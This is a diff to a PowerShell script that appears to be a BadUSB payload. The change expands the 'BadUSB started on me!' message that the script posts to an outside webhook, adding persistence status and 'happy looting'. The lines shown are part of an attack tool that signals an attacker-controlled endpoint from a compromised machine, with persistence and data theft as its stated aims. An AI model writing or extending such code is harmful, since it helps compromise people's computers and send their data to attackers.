@@ -61,10 +61,23 @@ New-Item -Path $env:tmp/$FolderName/Trees -ItemType Directory
 
 # Send out started message!
 $hookurl = "$dc"
+$text = "BadUSB started on me!"
+if ($pers -eq 'True') {
+	$text+=" Persistence is **enabled**!"
+}
+if ($pers -eq 'Remove') {
+	$text+=" Persistence is **being removed**!"
+}
+if ($pers -ne 'True') {
+	if ($pers -ne 'Remove') {
+	$text+=" Persistence is **not enabled**!"
+	}
+}
+$test += " Good luck and happy looting! :pirate_flag:"
 
 $Body = @{
   'username' = $FolderName
-  'content' = "BadUSB started on me!"
+  'content' = $text
 }
 
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
